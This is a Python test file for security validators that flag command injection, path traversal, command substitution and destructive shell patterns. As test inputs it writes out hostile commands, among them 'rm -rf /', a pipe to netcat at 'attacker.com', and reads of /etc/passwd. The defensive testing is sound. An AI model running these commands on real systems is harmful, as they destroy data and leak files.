"""Tests for preprocessing security validators."""

from core.preprocessing.security import (
    detect_command_injection,
    detect_dangerous_patterns,
    validate_safe_path,
)


def test_detect_command_injection_semicolon():
    issues = detect_command_injection("echo hello; rm -rf /", "cmd")
    assert len(issues) > 0
    assert any(";" in issue.description for issue in issues)


def test_detect_command_injection_pipe():
    issues = detect_command_injection("echo hello | nc attacker.com", "cmd")
    assert len(issues) > 0
    assert any("|" in issue.description for issue in issues)


def test_detect_command_injection_redirect():
    issues = detect_command_injection("echo hello > /tmp/file", "cmd")
    assert len(issues) > 0
    assert any(">" in issue.description for issue in issues)


def test_detect_command_injection_clean():
    issues = detect_command_injection("echo hello world", "cmd")
    assert len(issues) == 0


def test_detect_command_injection_builtin_skipped():
    issues = detect_command_injection("echo hello; rm -rf /", "builtin")
    assert len(issues) == 0


def test_validate_safe_path_traversal():
    issue = validate_safe_path("../../etc/passwd")
    assert issue is not None
    assert issue.type == "path_traversal"


def test_validate_safe_path_clean():
    issue = validate_safe_path("C:\\Users\\test")
    assert issue is None


def test_detect_dangerous_patterns_delete():
    issues = detect_dangerous_patterns("del /f /q C:\\*", "cmd")
    assert len(issues) > 0
    assert any("删除" in issue.description for issue in issues)


def test_detect_dangerous_patterns_format():
    issues = detect_dangerous_patterns("format C:", "cmd")
    assert len(issues) > 0
    assert any("格式化" in issue.description for issue in issues)


def test_detect_dangerous_patterns_shutdown():
    issues = detect_dangerous_patterns("shutdown /s /t 0", "cmd")
    assert len(issues) > 0
    assert any("关机" in issue.description for issue in issues)


def test_detect_dangerous_patterns_clean():
    issues = detect_dangerous_patterns("echo hello", "cmd")
    assert len(issues) == 0


def test_detect_dangerous_patterns_builtin_skipped():
    issues = detect_dangerous_patterns("format C:", "builtin")
    assert len(issues) == 0


# ── Bash 安全检测测试 ─────────────────────────────────────────────────


def test_bash_command_injection_detected():
    issues = detect_command_injection("echo hello; rm -rf /", "bash")
    assert len(issues) > 0
    assert any(";" in issue.description for issue in issues)


def test_bash_command_substitution_detected():
    issues = detect_command_injection("echo $(cat /etc/passwd)", "bash")
    assert any("command_substitution" == issue.type for issue in issues)


def test_bash_backtick_substitution_detected():
    issues = detect_command_injection("echo `whoami`", "bash")
    assert any("command_injection" == issue.type for issue in issues)


def test_bash_variable_quoting():
    from core.preprocessing.security import validate_variable_quoting

    issues = validate_variable_quoting("echo {{input}}", "bash")
    # Without :q, bash should flag unquoted variables
    # This depends on the find_unquoted_external_command_variables implementation
    # Just verify it doesn't crash and returns a list
    assert isinstance(issues, list)


def test_bash_dangerous_patterns():
    issues = detect_dangerous_patterns("rm -Recurse -Force /", "bash")
    assert len(issues) > 0


def test_bash_clean_command():
    issues = detect_command_injection("ls -la", "bash")
    assert len(issues) == 0
